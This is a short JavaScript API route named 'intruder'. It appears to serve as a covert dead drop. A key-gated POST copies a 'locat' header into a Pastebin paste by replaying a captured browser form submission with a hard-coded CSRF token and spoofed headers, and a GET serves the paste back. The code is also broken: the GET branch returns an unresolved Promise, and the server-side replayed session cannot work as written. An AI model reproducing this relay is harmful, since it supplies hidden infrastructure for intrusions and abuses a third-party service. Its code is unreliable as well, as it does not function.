const fs = require('fs');

export default function intruder(req, res) {
    const {locat} = req.headers;
    if (req.query.usagekey === process.env.special_key && req.method === "POST") {
        console.log(locat);
        fetch("https://pastebin.com/edit/MnuyW2kE", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en",
                "cache-control": "max-age=0",
                "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBXiZl1Qf01XOZzRR",
                "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Opera GX\";v=\"91\", \"Chromium\";v=\"105\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "https://pastebin.com/edit/MnuyW2kE",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"_csrf-frontend\"\r\n\r\n1m5O1Eq8iRvFRaiOhEgvUUkX11a4LPcJcH7zw33YFA3gNgalA_jOLYEH0eqze2YbL3idEOpYkk0KD5WnOOlGfQ==\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[text]\"\r\n\r\n${locat}\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[category_id]\"\r\n\r\n0\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[tag]\"\r\n\r\n\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[format]\"\r\n\r\n1\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[expiration]\"\r\n\r\nPREV\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[status]\"\r\n\r\n0\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[folder_key]\"\r\n\r\n\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[folder_name]\"\r\n\r\n\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[is_password_enabled]\"\r\n\r\n0\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[is_burn]\"\r\n\r\n0\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR\r\nContent-Disposition: form-data; name=\"PostForm[name]\"\r\n\r\n\r\n------WebKitFormBoundaryBXiZl1Qf01XOZzRR--\r\n`,
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        }).then(r => r.text());
        return res.status(200).json({message: "Location updated"});
    }
    if (req.method === "GET") {
        return res.status(200).json(fetch("https://pastebin.com/raw/MnuyW2kE").then(r => r.text()));
    } else {
        return res.status(404).json({message: "You cannot perform this action on this endpoint"});
    }
}